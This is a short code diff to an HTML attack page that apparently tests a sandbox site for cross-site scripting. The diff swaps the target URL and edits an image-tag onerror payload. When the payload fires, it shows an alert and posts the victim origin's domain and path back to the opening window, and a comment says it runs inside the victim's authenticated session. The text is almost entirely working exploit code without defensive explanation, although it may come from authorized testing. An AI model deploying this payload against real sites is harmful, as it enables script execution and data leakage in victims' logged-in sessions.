@@ -20,12 +20,12 @@
 <pre id="log" style="background:#111;color:#0f0;padding:12px;margin-top:16px;white-space:pre-wrap"></pre>
 
 <script>
-const TARGET = "https://vgzm3f5w6z20260729142526.sandbox.bamkounified.com";
+const TARGET = "https://3mxsu7cbs020260821101318.sandbox.bamkounified.com/";
 
 // The payload the operator asked for. onerror runs in the TARGET origin, inside the
 // victim's authenticated session, and posts document.domain back to us as proof.
 const PAYLOAD =
-  '<img src=x onerror="alert(\'being-aman\');' +
+  '<img src=x onerror="alert(\'xss\');' +
   'if(window.opener)opener.postMessage(\'XSSFIRED::\'+document.domain+\'|\'+location.pathname,\'*\')">';
 
 const log = document.getElementById('log');
